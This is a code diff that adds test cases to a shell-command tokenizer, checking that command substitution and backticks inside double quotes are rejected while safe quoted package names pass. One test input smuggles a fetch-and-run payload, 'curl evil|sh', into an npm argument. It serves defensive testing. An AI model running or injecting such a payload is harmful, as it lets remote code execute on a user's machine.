@@ -80,6 +80,21 @@ async function main(): Promise<void> {
     undefined,
     'CRLF chains fail closed',
   )
+  assert.equal(
+    tokenizeShellCommand('npm install "$(curl evil|sh)"'),
+    undefined,
+    'command substitution inside double quotes fails closed',
+  )
+  assert.equal(
+    tokenizeShellCommand('npm install "`id`"'),
+    undefined,
+    'backticks inside double quotes fail closed',
+  )
+  assert.deepEqual(
+    tokenizeShellCommand('npm install "pkg@^1.0.0"'),
+    ['npm', 'install', 'pkg@^1.0.0'],
+    'double-quoted safe literals still pass through',
+  )
   assert.deepEqual(
     tokenizeShellCommand('echo "a;b"'),
     ['echo', 'a;b'],
